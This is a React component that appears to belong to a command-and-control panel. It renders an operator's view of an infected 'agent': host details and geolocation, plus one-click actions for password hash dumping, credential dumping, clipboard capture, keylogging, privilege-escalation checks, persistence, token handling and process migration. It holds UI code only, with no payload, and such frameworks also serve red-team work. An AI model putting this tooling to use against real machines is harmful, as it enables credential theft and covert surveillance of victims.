"use client";

import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import Link from "next/link";
import { CopyButton, StatusBadge, Spinner } from "@/components/UI";
import type { AgentDetail, AgentStatus } from "@/types/agent";
import { Activity, Apple, Camera, Clipboard, Crown, Database, FolderOpen, History, Key, Keyboard, Link as LinkIcon, ListChecks, MapPin, Monitor, MoreHorizontal, RefreshCw, Shield, Skull, SlidersHorizontal, Terminal, Trash2 } from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { DropdownMenu, DropdownMenuTrigger, DropdownMenuContent, DropdownMenuItem, DropdownMenuSeparator } from "@/components/ui/dropdown-menu";
import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip";
import { useI18n } from "@/lib/i18n";
import { useState } from "react";

function getOSIcon(os: string): React.ReactNode {
  const cls = "w-7 h-7 text-primary";
  switch (os.toLowerCase()) {
    case "windows": return <Monitor className={cls} />;
    case "linux": return <Terminal className={cls} />;
    case "darwin": case "macos": return <Apple className={cls} />;
    default: return <Monitor className={cls} />;
  }
}

export interface AgentHeaderProps {
  agent: Partial<AgentDetail>;
  agentId: string;
  agentAge: string;
  status: AgentStatus;
  actionLoading: string | null;
  onQuickAction: (action: string, label: string) => void;
  credCount: number | null;
  onKill: () => void;
  onUninstall: () => void;
  onMigrate?: () => void;
  onClose?: () => void;
}

export default function AgentHeader({
  agent, agentId, status,
  actionLoading, onQuickAction, credCount, onKill, onUninstall, onMigrate,
}: AgentHeaderProps) {
  const { t } = useI18n();
  const hostname = agent.hostname || "\u2014";
  const ip = agent.ip || "\u2014";
  const publicIP = agent.public_ip || "";
  const os = agent.os || "\u2014";
  const arch = agent.arch || "\u2014";
  const username = agent.username || "\u2014";
  const integrity = agent.integrity || "";
  const elevated = Boolean(agent.elevated);
  const domain = agent.domain || "";
  const country = agent.country || "";
  const city = agent.city || "";

  const [lastSeenMinutes] = useState(() =>
    agent.last_seen
      ? (Date.now() - new Date(agent.last_seen).getTime()) / 60000
      : undefined
  );

  const quickActions = [
    { action: "screenshot", label: t("agents.header_screenshot"), icon: <Camera className="w-5 h-5" /> },
    { action: "ps", label: t("agents.header_processes"), icon: <ListChecks className="w-5 h-5" /> },
    { action: "hashdump", label: t("agents.header_hashdump"), icon: <Database className="w-5 h-5" /> },
    { action: "creds_dump", label: t("agents.header_creds_dump"), icon: <Database className="w-5 h-5" />, badge: credCount },
    { action: "clipboard_get", label: t("agents.header_clipboard"), icon: <Clipboard className="w-5 h-5" /> },
    { action: "privesc_check", label: t("agents.header_privesc"), icon: <Shield className="w-5 h-5" /> },
    { action: "keylogger_start", label: t("agents.header_key_start"), icon: <Terminal className="w-5 h-5" /> },
    { action: "keylogger_stop", label: t("agents.header_key_stop"), icon: <Keyboard className="w-5 h-5" /> },
    { action: "keylogger_dump", label: t("agents.header_key_dump"), icon: <Database className="w-5 h-5" /> },
  ];

  return (
    <>
      <Card className="mb-4 overflow-hidden border-border/70 bg-card/90 shadow-sm">
        <div className="h-1 w-full bg-gradient-to-r from-primary via-cyan-500 to-emerald-500" />
        <div className="p-4 sm:p-5">
          <div className="flex flex-col gap-4 xl:flex-row xl:items-start xl:justify-between">
            <div className="flex min-w-0 flex-1 items-start gap-4">
              <div
                className="w-14 h-14 rounded-2xl bg-primary/10 ring-1 ring-primary/10 flex items-center justify-center shrink-0 select-none shadow-sm"
              >
                {getOSIcon(os)}
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-2 flex-wrap">
                  <h1 className="text-xl font-bold text-foreground truncate">{hostname}</h1>
                  <StatusBadge status={status} pulse={status === "online"} />
                  {integrity && (
                    <Badge variant={integrity.toLowerCase() === "system" || integrity.toLowerCase() === "high" ? "destructive" : integrity.toLowerCase() === "medium" ? "secondary" : "outline"} className="text-(--fs-micro-sm) uppercase">
                      {integrity}
                    </Badge>
                  )}
                  {elevated && (
                    <Badge variant="warning" className="text-(--fs-micro-sm)">
                      <Crown className="w-4 h-4" />
                      {t("agents.header_elevated")}
                    </Badge>
                  )}
                </div>
                <div className="mt-2 flex flex-wrap gap-2 text-xs text-muted-foreground">
                  <span className="inline-flex items-center gap-1.5 rounded-full border border-border/70 bg-muted/30 px-2.5 py-1">
                    <span className="text-(--fs-micro-sm) uppercase tracking-wide text-muted-foreground/70">IP</span>
                    <span className="font-mono text-foreground">{ip}</span>
                    <CopyButton text={ip} label="IP" />
                  </span>
                  {publicIP && (
                    <span className="inline-flex items-center gap-1.5 rounded-full border border-border/70 bg-muted/30 px-2.5 py-1">
                      <span className="text-(--fs-micro-sm) uppercase tracking-wide text-muted-foreground/70">{t("agents.header_wan")}</span>
                      <span className="font-mono text-foreground">{publicIP}</span>
                      <CopyButton text={publicIP} label="Public IP" />
                    </span>
                  )}
                  <span className="inline-flex items-center gap-1.5 rounded-full border border-border/70 bg-muted/30 px-2.5 py-1">
                    <span className="text-(--fs-micro-sm) uppercase tracking-wide text-muted-foreground/70">{t("agents.header_user")}</span>
                    <span className="text-foreground">{username}</span>
                  </span>
                  <span className="inline-flex items-center gap-1.5 rounded-full border border-border/70 bg-muted/30 px-2.5 py-1">
                    <span className="text-(--fs-micro-sm) uppercase tracking-wide text-muted-foreground/70">OS</span>
                    <span className="text-foreground">{os} {arch}</span>
                  </span>
                  {domain && (
                    <span className="inline-flex items-center gap-1.5 rounded-full border border-border/70 bg-muted/30 px-2.5 py-1">
                      <span className="text-(--fs-micro-sm) uppercase tracking-wide text-muted-foreground/70">{t("agents.header_domain")}</span>
                      <span className="text-foreground">{domain}</span>
                    </span>
                  )}
                </div>
                {country && (
                  <p className="mt-2 flex items-center gap-1.5 text-xs text-muted-foreground/70">
                    <MapPin className="w-4 h-4" />
                    {[country, city].filter(Boolean).join(", ")}
                  </p>
                )}
              </div>
            </div>
            <div className="grid grid-cols-2 gap-2 sm:grid-cols-4 xl:w-[34rem]">
              <Button variant="outline" size="sm" render={<Link href={`/agents/${agentId}/shell`} />}><Terminal className="w-4 h-4" /> {t("agents.shell_title")} <kbd className="text-(--fs-micro-sm) opacity-50 ml-1">S</kbd></Button>
              <Button variant="outline" size="sm" render={<Link href={`/agents/${agentId}/files`} />}><FolderOpen className="w-4 h-4" /> {t("agents.files_title")} <kbd className="text-(--fs-micro-sm) opacity-50 ml-1">F</kbd></Button>
              <Button variant="outline" size="sm" render={<Link href={`/agents/${agentId}/screen`} />}><Monitor className="w-4 h-4" /> {t("agents.screen_title")} <kbd className="text-(--fs-micro-sm) opacity-50 ml-1">D</kbd></Button>
              <DropdownMenu>
                <DropdownMenuTrigger render={<Button variant="secondary" size="sm" className="gap-1.5"><MoreHorizontal className="w-4 h-4" /> {t("agents.header_more")}</Button>} />
                <DropdownMenuContent className="w-48">
                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/token`} />}><Key className="w-4 h-4" /> {t("agents.token_title")}</DropdownMenuItem>
                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/persistence`} />}><LinkIcon className="w-4 h-4" /> {t("agents.persistence_title")}</DropdownMenuItem>
                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/remote-desktop`} />}><Monitor className="w-4 h-4" /> {t("agents.rdp_title")}</DropdownMenuItem>
                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/recording`} />}><History className="w-4 h-4" /> {t("agents.recording_title")}</DropdownMenuItem>
                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/config`} />}><SlidersHorizontal className="w-4 h-4" /> {t("agents.config_hot_config")}</DropdownMenuItem>
                  <DropdownMenuItem render={<Link href={`/agents/${agentId}/traffic`} />}><Activity className="w-4 h-4" /> {t("agents.traffic_title")}</DropdownMenuItem>
                  {onMigrate && (
                    <DropdownMenuItem onClick={onMigrate}><RefreshCw className="w-4 h-4" /> {t("agents.header_migrate")}</DropdownMenuItem>
                  )}
                  <DropdownMenuSeparator />
                  <DropdownMenuItem variant="destructive" onClick={onKill}><Skull className="w-4 h-4" /> {t("agents.kill_agent")}</DropdownMenuItem>
                  <DropdownMenuItem variant="destructive" onClick={onUninstall}><Trash2 className="w-4 h-4" /> {t("agents.uninstall")}</DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>
        </div>
      </Card>

      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 mb-4">
        {quickActions.map((item) => (
          <Tooltip key={item.action}>
            <TooltipTrigger render={
              <Button
                variant="ghost"
                disabled={status !== "online" || actionLoading !== null}
                onClick={() => onQuickAction(item.action, item.label)}
                className={`group relative overflow-hidden rounded-xl border border-border/70 bg-card/90 p-3.5 flex flex-col items-center gap-2.5 text-center transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:border-primary/20 ${status !== "online" || actionLoading !== null ? "opacity-40" : ""}`}
              />
            }>
              <span className="flex h-9 w-9 items-center justify-center rounded-full bg-primary/10 text-primary transition-transform group-hover:scale-105">
                {actionLoading === item.action ? <Spinner size="sm" /> : item.icon}
              </span>
              <span className="text-(--fs-micro-sm) font-medium text-foreground leading-tight text-center">{item.label}</span>
              {"badge" in item && item.badge != null && (item.badge as number) > 0 && (
                <Badge className="absolute top-1 right-1 min-w-[16px] h-4 px-1 text-(--fs-micro-sm)">{(item.badge as number) > 99 ? "99+" : (item.badge as number)}</Badge>
              )}
            </TooltipTrigger>
            <TooltipContent>{item.label}</TooltipContent>
          </Tooltip>
        ))}
      </div>
    </>
  );
}
